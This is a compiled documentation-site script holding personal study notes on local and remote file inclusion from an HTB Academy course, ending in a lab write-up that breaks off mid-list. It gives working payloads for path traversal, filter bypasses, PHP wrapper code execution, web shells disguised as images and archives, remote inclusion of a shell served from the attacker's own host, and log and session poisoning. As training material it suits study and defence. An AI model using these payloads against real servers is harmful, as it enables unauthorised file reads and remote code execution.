"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[2530],{2333:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/lfi-84d379217c79c75fb37157fb28e3812a.png"},3546:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>d,contentTitle:()=>r,default:()=>c,frontMatter:()=>l,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"Hacking/HTB Academy/File inclusion","title":"File inclusion","description":"To reduce the amount of code required, sometimes the page or section to render is passed with a parameter. If this feature is not properly secured an attacker can use this parameter to display the content of any file.","source":"@site/docs/Hacking/HTB Academy/File inclusion.md","sourceDirName":"Hacking/HTB Academy","slug":"/Hacking/HTB Academy/File inclusion","permalink":"/docs/Hacking/HTB Academy/File inclusion","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Android Fundamentals","permalink":"/docs/Hacking/HTB Academy/Android Fundamentals"},"next":{"title":"File transfer","permalink":"/docs/Hacking/HTB Academy/File transfers"}}');var a=i(4848),t=i(8453);const l={},r="File inclusion",d={},o=[{value:"Local file inclusion",id:"local-file-inclusion",level:2},{value:"Basic LFI",id:"basic-lfi",level:3},{value:"Path traversal",id:"path-traversal",level:3},{value:"Filename prefix",id:"filename-prefix",level:3},{value:"Appended extensions",id:"appended-extensions",level:3},{value:"Second order attacks",id:"second-order-attacks",level:3},{value:"Basic bypass",id:"basic-bypass",level:2},{value:"Search and replace filter",id:"search-and-replace-filter",level:3},{value:"Encoding",id:"encoding",level:3},{value:"Approved paths",id:"approved-paths",level:3},{value:"Approved extension",id:"approved-extension",level:3},{value:"Path Truncation",id:"path-truncation",level:4},{value:"Null bytes",id:"null-bytes",level:4},{value:"PHP Filters",id:"php-filters",level:2},{value:"PHP Wrappers",id:"php-wrappers",level:2},{value:"Data wrapper",id:"data-wrapper",level:3},{value:"Input wrapper",id:"input-wrapper",level:3},{value:"Expect wrapper",id:"expect-wrapper",level:3},{value:"Remote File Inclusion",id:"remote-file-inclusion",level:2},{value:"LFI and file uploads",id:"lfi-and-file-uploads",level:2},{value:"Log poisoning",id:"log-poisoning",level:2},{value:"PHP Session poisoning",id:"php-session-poisoning",level:2},{value:"Server log poisoning",id:"server-log-poisoning",level:2},{value:"Fuzzing parameters",id:"fuzzing-parameters",level:2},{value:"Skills assessment",id:"skills-assessment",level:2}];function h(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"file-inclusion",children:"File inclusion"})}),"\n",(0,a.jsx)(n.p,{children:"To reduce the amount of code required, sometimes the page or section to render is passed with a parameter. If this feature is not properly secured an attacker can use this parameter to display the content of any file."}),"\n",(0,a.jsx)(n.h2,{id:"local-file-inclusion",children:"Local file inclusion"}),"\n",(0,a.jsx)(n.p,{children:"This vulnerability happens typically on templating engines. For example:"}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"/index.php?page=about"})," and ",(0,a.jsx)(n.code,{children:"about"})," is a PHP file in the same directory."]}),"\n",(0,a.jsx)(n.p,{children:"File Inclusion vulnerabilities may occur in any web server and any development frameworks, as all of them provide functionalities for loading dynamic content and handling front-end templates."}),"\n",(0,a.jsx)(n.p,{children:"The most important thing to keep in mind is that some of the above functions only read the content of the specified files, while others also execute the specified files. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server."}),"\n",(0,a.jsx)(n.p,{children:"The following table shows which functions may execute files and which only read file content:"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:i(2333).A+"",width:"1013",height:"836"})}),"\n",(0,a.jsx)(n.h3,{id:"basic-lfi",children:"Basic LFI"}),"\n",(0,a.jsxs)(n.p,{children:["One example of basic LFI, can be ",(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=es.php"}),". In a webpage, when we change the language, another file is read (",(0,a.jsx)(n.code,{children:"es.php"}),")."]}),"\n",(0,a.jsxs)(n.p,{children:["Two common readable files that are available on most back-end servers are ",(0,a.jsx)(n.code,{children:"/etc/passwd"})," on Linux and ",(0,a.jsx)(n.code,{children:"C:\\Windows\\boot.ini"})," on Windows. So, let's change the parameter from es to /etc/passwd: ",(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd"})," and we retrieve the ",(0,a.jsx)(n.code,{children:"/etc/passwd"})," file contents."]}),"\n",(0,a.jsx)(n.h3,{id:"path-traversal",children:"Path traversal"}),"\n",(0,a.jsx)(n.p,{children:'There might be cases where the file inclusion is "restricted" to some folder:'}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"include(\"./languages/\" . $_GET['language']);\n"})}),"\n",(0,a.jsxs)(n.p,{children:["The languages are loaded from the ",(0,a.jsx)(n.code,{children:"languages"})," folder. In this case, if we visit the URL in the previous section, it will not work because it will try to read the file in ",(0,a.jsx)(n.code,{children:"./languages/etc/password"}),"."]}),"\n",(0,a.jsxs)(n.p,{children:["We can easily bypass this restriction using ",(0,a.jsx)(n.code,{children:"relative paths"}),". We can add ",(0,a.jsx)(n.code,{children:"../"})," to visit the parent directory. So, we can use this trick to go back several directories until we reach the root path (i.e. /), and then specify our absolute file path (e.g. ../../../../etc/passwd), and the file should exist:"]}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd"}),"."]}),"\n",(0,a.jsx)(n.h3,{id:"filename-prefix",children:"Filename prefix"}),"\n",(0,a.jsx)(n.p,{children:"On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"include(\"lang_\" . $_GET['language']);\n"})}),"\n",(0,a.jsx)(n.p,{children:"In this case, if we try to traverse the directory with ../../../etc/passwd, the final string would be lang_../../../etc/passwd, which is invalid."}),"\n",(0,a.jsxs)(n.p,{children:["instead of directly using path traversal, we can prefix a ",(0,a.jsx)(n.code,{children:"/"})," before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories."]}),"\n",(0,a.jsx)(n.p,{children:"This may not always work, as in this example a directory named lang_/ may not exist, so our relative path may not be correct."}),"\n",(0,a.jsx)(n.h3,{id:"appended-extensions",children:"Appended extensions"}),"\n",(0,a.jsx)(n.p,{children:"Sometimes, the extension of the file is included in the backend code:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"include($_GET['language'] . \".php\");\n"})}),"\n",(0,a.jsx)(n.p,{children:"if we try to read /etc/passwd, then the file included would be /etc/passwd.php, which does not exist."}),"\n",(0,a.jsx)(n.p,{children:"The bypass for this will be discussed in future sections."}),"\n",(0,a.jsx)(n.h3,{id:"second-order-attacks",children:"Second order attacks"}),"\n",(0,a.jsx)(n.p,{children:"This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters."}),"\n",(0,a.jsx)(n.p,{children:"For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png). If we craft a malicious LFI username (e.g. ../../../etc/passwd), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar."}),"\n",(0,a.jsx)(n.h2,{id:"basic-bypass",children:"Basic bypass"}),"\n",(0,a.jsx)(n.p,{children:"The developers usually put some mechanism to protect user inputs. However, most of them can be bypassed."}),"\n",(0,a.jsx)(n.h3,{id:"search-and-replace-filter",children:"Search and replace filter"}),"\n",(0,a.jsxs)(n.p,{children:["Detect and deletes substrings of ",(0,a.jsx)(n.code,{children:"../"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"$language = str_replace('../', '', $_GET['language']);\n"})}),"\n",(0,a.jsxs)(n.p,{children:["In this case, it does not replace recursively, it will only replace the first entry of ",(0,a.jsx)(n.code,{children:"../"}),". So, ",(0,a.jsx)(n.code,{children:"....//"})," would become ",(0,a.jsx)(n.code,{children:"../"})," and this way we can retrieve the file."]}),"\n",(0,a.jsx)(n.p,{children:"There are other ways of bypassing the search replace, we may use ..././ or ..../ and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. ..../), or adding extra forward slashes (e.g. ....////)"}),"\n",(0,a.jsx)(n.h3,{id:"encoding",children:"Encoding"}),"\n",(0,a.jsx)(n.p,{children:"Sometimes, when the payload is URL encoded and the check is implemented poorly, the limitation will be bypassed. For example:"}),"\n",(0,a.jsxs)(n.p,{children:["If the target web application did not allow ",(0,a.jsx)(n.code,{children:"."})," and ",(0,a.jsx)(n.code,{children:"/"})," in our input, we can URL encode ",(0,a.jsx)(n.code,{children:"../"})," into ",(0,a.jsx)(n.code,{children:"%2e%2e%2f"}),", which may bypass the filter."]}),"\n",(0,a.jsx)(n.p,{children:"Sometimes double URL encode might help bypassing the filter."}),"\n",(0,a.jsx)(n.h3,{id:"approved-paths",children:"Approved paths"}),"\n",(0,a.jsx)(n.p,{children:"Sometimes, the application restrict the user input to make sure if lands in an approved path, e.g."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"if(preg_match('/^\\.\\/languages\\/.+$/', $_GET['language'])) {\n    include($_GET['language']);\n} else {\n    echo 'Illegal path specified!';\n}\n"})}),"\n",(0,a.jsxs)(n.p,{children:["To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back to the root directory and read the file we specify, as follows: ",(0,a.jsx)(n.code,{children:"<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd"})]}),"\n",(0,a.jsx)(n.h3,{id:"approved-extension",children:"Approved extension"}),"\n",(0,a.jsx)(n.p,{children:"With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful e.g. for reading source code."}),"\n",(0,a.jsx)(n.h4,{id:"path-truncation",children:"Path Truncation"}),"\n",(0,a.jsx)(n.p,{children:"In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd)."}),"\n",(0,a.jsx)(n.p,{children:"If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (.php) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work."}),"\n",(0,a.jsx)(n.p,{children:"we should calculate the full length of the string to ensure only .php gets truncated"}),"\n",(0,a.jsx)(n.h4,{id:"null-bytes",children:"Null bytes"}),"\n",(0,a.jsx)(n.p,{children:"Adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it."}),"\n",(0,a.jsxs)(n.p,{children:["To exploit this vulnerability, we can end our payload with a null byte (e.g. ",(0,a.jsx)(n.code,{children:"/etc/passwd%00"}),"), such that the final path passed to include() would be (",(0,a.jsx)(n.code,{children:"/etc/passwd%00.php"}),"). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension."]}),"\n",(0,a.jsx)(n.h2,{id:"php-filters",children:"PHP Filters"}),"\n",(0,a.jsxs)(n.p,{children:["PHP has a built-in feature named ",(0,a.jsx)(n.code,{children:"PHP Wrappers"}),". They allow developers to access different I/O stream at application level, such as stdin, stdout, etc..."]}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"PHP filters"})," are a special type of PHP wrappers to pass different types of input and have it filtered. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the ",(0,a.jsx)(n.code,{children:"convert.base64-encode"})," filter, under Conversion Filters."]}),"\n",(0,a.jsxs)(n.p,{children:["The first step is to use ",(0,a.jsx)(n.code,{children:"fuff"})," to enumerate PHP files. Normally in php LFI inclusion, the PHP gets executed and the source code cannot be seen."]}),"\n",(0,a.jsx)(n.p,{children:"For example:"}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=config"})," will execute the ",(0,a.jsx)(n.code,{children:"config.php"})," file and we'll not see anything in the website."]}),"\n",(0,a.jsx)(n.p,{children:"However, we can leverage php filter to transform the file to base64:"}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"php://filter/read=convert.base64-encode/resource=config"}),":"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config"})}),"\n",(0,a.jsxs)(n.p,{children:["Later, we can transform the source code using ",(0,a.jsx)(n.code,{children:"base64 -d"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d\n"})}),"\n",(0,a.jsx)(n.h2,{id:"php-wrappers",children:"PHP Wrappers"}),"\n",(0,a.jsx)(n.p,{children:"There are other PHP wrappers that would be extremely useful."}),"\n",(0,a.jsx)(n.h3,{id:"data-wrapper",children:"Data wrapper"}),"\n",(0,a.jsxs)(n.p,{children:["The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the ",(0,a.jsx)(n.code,{children:"allow_url_include"})," setting is enabled in the PHP configurations."]}),"\n",(0,a.jsxs)(n.p,{children:["First we need to check if that flag is enabled or not. In order to do so, we'll use ",(0,a.jsx)(n.code,{children:"base64"})," wrapper to retrieve the files in:"]}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"/etc/php/X.Y/apache2/php.ini"})," for Apache or,\n",(0,a.jsx)(n.code,{children:"/etc/php/X.Y/fpm/php.ini"})," for nginx."]}),"\n",(0,a.jsx)(n.p,{children:"If we don't know exactly the PHP version, we can try all of them."}),"\n",(0,a.jsx)(n.p,{children:"For example:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"\n'})}),"\n",(0,a.jsxs)(n.p,{children:["Now, we can pass the PHP code we want to execute encoded in base64 to the ",(0,a.jsx)(n.code,{children:"data"})," wrapper:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"echo '<?php system($_GET[\"cmd\"]); ?>' | base64\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id"})}),"\n",(0,a.jsx)(n.p,{children:"And we can execute any command via PHP. We can do it via cURL:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"adriangalera@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid\n            uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"})}),"\n",(0,a.jsx)(n.h3,{id:"input-wrapper",children:"Input wrapper"}),"\n",(0,a.jsx)(n.p,{children:"Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting, as mentioned earlier."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'curl -s -X POST --data \'<?php system($_GET["cmd"]); ?>\' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid\n'})}),"\n",(0,a.jsx)(n.p,{children:"Additionally, we can add the command directly into the data, e.g:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"<\\?php system('id')?>\n"})}),"\n",(0,a.jsx)(n.h3,{id:"expect-wrapper",children:"Expect wrapper"}),"\n",(0,a.jsxs)(n.p,{children:["Works in a similar way of the previous one, but it is external and needs to be manually installed. First, we need to check if it's configured checking for ",(0,a.jsx)(n.code,{children:"extension=expect"})," in php.ini"]}),"\n",(0,a.jsx)(n.p,{children:"If present, the attack is straightforward:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"\n'})}),"\n",(0,a.jsx)(n.h2,{id:"remote-file-inclusion",children:"Remote File Inclusion"}),"\n",(0,a.jsx)(n.p,{children:"In some cases, we are able to include not only local files, but remote files. This is very useful to the attacker, since it can host a malicious script in the machine and force the application to include it."}),"\n",(0,a.jsxs)(n.p,{children:["Usually the language has some config that disables RFI completely, but in some cases it is enabled. In PHP, the config is the same as we have seen before: ",(0,a.jsx)(n.code,{children:"allow_url_include = On"}),"."]}),"\n",(0,a.jsx)(n.p,{children:"There are some import functions vulnerable to RFI while the others don't. Refer to the table at the beginning for reference."}),"\n",(0,a.jsx)(n.p,{children:"So, the first step is to verify if we can do a RFI. Try to include a local URL:"}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php"}),"."]}),"\n",(0,a.jsx)(n.p,{children:"We can use RFI to do Remote Code execution:"}),"\n",(0,a.jsx)(n.p,{children:"We can craft a malicious script:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php\n"})}),"\n",(0,a.jsx)(n.p,{children:"and host it in our machine:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo python3 -m http.server <LISTENING_PORT>\n"})}),"\n",(0,a.jsx)(n.p,{children:"Later on, we can include our URL as the RFI to perform RCE."}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id"})}),"\n",(0,a.jsxs)(n.p,{children:["We can host our file using ",(0,a.jsx)(n.code,{children:"FTP"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo python -m pyftpdlib -p 21\n"})}),"\n",(0,a.jsx)(n.p,{children:"and include it:"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id"})}),"\n",(0,a.jsxs)(n.p,{children:["If the server is a Windows machine, we don't need the ",(0,a.jsx)(n.code,{children:"allow_url_include"}),". We can use ",(0,a.jsx)(n.code,{children:"SMB"})," protocol for RFI. This is because Windows treats files on remote SMB servers as normal files"]}),"\n",(0,a.jsxs)(n.p,{children:["We can spin up a samba server using ",(0,a.jsx)(n.code,{children:"impacket smbserver.py"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"impacket-smbserver -smb2support share $(pwd)\n"})}),"\n",(0,a.jsx)(n.p,{children:"And include our URL by using a UNC path:"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=\\\\<OUR_IP>\\share\\shell.php&cmd=whoami"})}),"\n",(0,a.jsx)(n.h2,{id:"lfi-and-file-uploads",children:"LFI and file uploads"}),"\n",(0,a.jsxs)(n.p,{children:["If the application allows the user to upload files, this might lead to LFI. For example, an application allow the user to upload an image, however, we can upload a PHP web shell. If the importing function has ",(0,a.jsx)(n.code,{children:"Execute"})," capabilities it will execute the code uploaded."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"echo 'GIF8<?php system($_GET[\"cmd\"]); ?>' > shell.gif\n"})}),"\n",(0,a.jsx)(n.p,{children:"We then upload this gif as our profile picture. Later in the application, we see where it is imported:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-html",children:'<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">\n'})}),"\n",(0,a.jsxs)(n.p,{children:["in index.php. We just need to pass the ",(0,a.jsx)(n.code,{children:"cmd"})," parameter now:"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id"})}),"\n",(0,a.jsxs)(n.p,{children:["Something similar can be achieve with the ",(0,a.jsx)(n.code,{children:"zip"})," wrapper (not enabled by default)."]}),"\n",(0,a.jsx)(n.p,{children:"We can create a malicious zip disguised as an image:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php && zip shell.jpg shell.php\n"})}),"\n",(0,a.jsxs)(n.p,{children:["And use the ",(0,a.jsx)(n.code,{children:"zip"})," wrapper for RCE:"]}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"}),"."]}),"\n",(0,a.jsxs)(n.p,{children:["We can also use the ",(0,a.jsx)(n.code,{children:"phar"})," wrapper to the same."]}),"\n",(0,a.jsx)(n.p,{children:"To do so, we can write a PHP script:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-php",children:"<?php\n$phar = new Phar('shell.phar');\n$phar->startBuffering();\n$phar->addFromString('shell.txt', '<?php system($_GET[\"cmd\"]); ?>');\n$phar->setStub('<?php __HALT_COMPILER(); ?>');\n\n$phar->stopBuffering();\n"})}),"\n",(0,a.jsxs)(n.p,{children:["We can compile it into a ",(0,a.jsx)(n.code,{children:"phar"})," file and later rename it to an image:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg\n"})}),"\n",(0,a.jsx)(n.p,{children:"And similarly include it:"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id"})}),"\n",(0,a.jsx)(n.h2,{id:"log-poisoning",children:"Log poisoning"}),"\n",(0,a.jsxs)(n.p,{children:["This types of attacks rely on importing functions that have the ",(0,a.jsx)(n.code,{children:"Execute"})," privileges. The main idea is that if we are aware of any info that is logged to a file, we can send our malicious payload so that it gets logged. Then, we'll import the poisoned log to be executed."]}),"\n",(0,a.jsx)(n.h2,{id:"php-session-poisoning",children:"PHP Session poisoning"}),"\n",(0,a.jsxs)(n.p,{children:["Similar to log poisoning, session data is stored in files in /var/lib/php/sessions/ on Linux and in C:\\Windows\\Temp\\ on Windows. E.g, if the PHPSESSIONID is ",(0,a.jsx)(n.code,{children:"el4ukv0kqbvoirg7nkp4dncpk3"}),", the location in the disk will be ",(0,a.jsx)(n.code,{children:"/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3"}),"."]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd"})}),"\n",(0,a.jsxs)(n.p,{children:["Now, we should look for some value in the session that is under our control. For example, ",(0,a.jsx)(n.code,{children:"language"}),"."]}),"\n",(0,a.jsx)(n.p,{children:"We can write a URL-encoded web shell in language:"}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"}),"."]}),"\n",(0,a.jsx)(n.p,{children:"Then, when we visit the page with the session LFI, we'll get Remote Code Execution:"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id"})}),"\n",(0,a.jsx)(n.h2,{id:"server-log-poisoning",children:"Server log poisoning"}),"\n",(0,a.jsx)(n.p,{children:"We can abuse Apache or Nginx access or error logs to inject some malicious PHP that will be imported with the LFI vulnerability."}),"\n",(0,a.jsx)(n.p,{children:"We can control the User-Agent of our client, therefore, we can send a request with User-Agent header with the web shell:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'adriangalera@htb[/htb]$ echo -n "User-Agent: <?php system(\\$_GET[\'cmd\']); ?>" > Poison\nadriangalera@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison\n'})}),"\n",(0,a.jsx)(n.p,{children:"The poisoning technique might be used for SSH, mail or ftp logs."}),"\n",(0,a.jsx)(n.p,{children:"We should determine first if we have access to the files using the LFI."}),"\n",(0,a.jsx)(n.h2,{id:"fuzzing-parameters",children:"Fuzzing parameters"}),"\n",(0,a.jsx)(n.p,{children:"Usually, the parameters in forms and such are well protected. However, there might be hidden parameters not well secured and vulnerable to LFI."}),"\n",(0,a.jsxs)(n.p,{children:["Example with ",(0,a.jsx)(n.code,{children:"fuff"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'\n"})}),"\n",(0,a.jsx)(n.p,{children:"We can find good wordlists for LFI seclists: Fuzzing/LFI and LFI-Jhaddix."}),"\n",(0,a.jsx)(n.p,{children:"We can use the LFI to discover the contents of the server, for example identifying the server root. For example:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' \n"})}),"\n",(0,a.jsx)(n.p,{children:"Depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords."}),"\n",(0,a.jsxs)(n.p,{children:["Same technique can be leveraged to find server configuration or logs. For example, these two wordlists ",(0,a.jsx)(n.a,{href:"https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux",children:"https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux"})," and ",(0,a.jsx)(n.a,{href:"https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows",children:"https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows"})," allows to reveal several configuration and log files."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ'\n"})}),"\n",(0,a.jsx)(n.h2,{id:"skills-assessment",children:"Skills assessment"}),"\n",(0,a.jsxs)(n.p,{children:["This is the write-up for the assessment of HTB academy ",(0,a.jsx)(n.a,{href:"https://academy.hackthebox.com/module/details/23",children:"File inclusion"})," module."]}),"\n",(0,a.jsx)(n.p,{children:"This a little bit tricky because we know which vulnerability to exploit here: file inclusion."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"whatweb 94.237.49.11:31840/index.php           \nhttp://94.237.49.11:31840/index.php [200 OK] Bootstrap, Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.18.0], IP[94.237.49.11], JQuery[3.3.1], PHP[7.3.22], Script, Title[InlaneFreight], X-Powered-By[PHP/7.3.22], nginx[1.18.0]\n"})}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"whatweb"})," reveals we're dealing with a PHP/7.3.22 page served by an nginx/1.18.0."]}),"\n",(0,a.jsxs)(n.p,{children:["While navigating as a regular user in the website, we can see the URL has a ",(0,a.jsx)(n.code,{children:"page"})," parameter which looks promising for LFI vulnerability."]}),"\n",(0,a.jsxs)(n.p,{children:["Visiting ",(0,a.jsx)(n.a,{href:"http://94.237.49.11:31840/index.php?page=industries../",children:"http://94.237.49.11:31840/index.php?page=industries../"})," shows ",(0,a.jsx)(n.code,{children:"Invalid input detected!"})," which is the contents of ",(0,a.jsx)(n.code,{children:"error.php"})," page."]}),"\n",(0,a.jsx)(n.p,{children:"Let's try the basic bypasses:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"Double the input: ./ become ..//. Nothing"}),"\n",(0,a.jsx)(n.li,{children:"URL encode the symbols: nothing"}),"\n",(0,a.jsx)(n.li,{children:"Try to escape the approve path: N/A because the pages are in root"}),"\n",(0,a.jsx)(n.li,{children:"Path truncation: N/A PHP version is 